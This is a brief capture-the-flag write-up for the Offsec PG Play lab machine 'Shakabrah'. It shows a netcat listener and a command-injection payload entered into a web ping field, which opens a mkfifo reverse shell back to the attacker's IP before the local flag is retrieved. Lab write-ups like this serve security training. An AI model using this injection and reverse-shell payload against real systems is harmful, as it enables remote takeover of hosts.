###### tags: `Offsec` `PG Play` `Easy` `Linux` # Shakabrah
```
┌──(kali㉿kali)-[~/pgplay]
...
``` `http://192.168.217.86/`has a ping's field, executeping, executereverse
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80 

192.168.45.192; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.192 80 >/tmp/f
``` wait for reverse shell,can in `/home/dylan`get local.txt
```
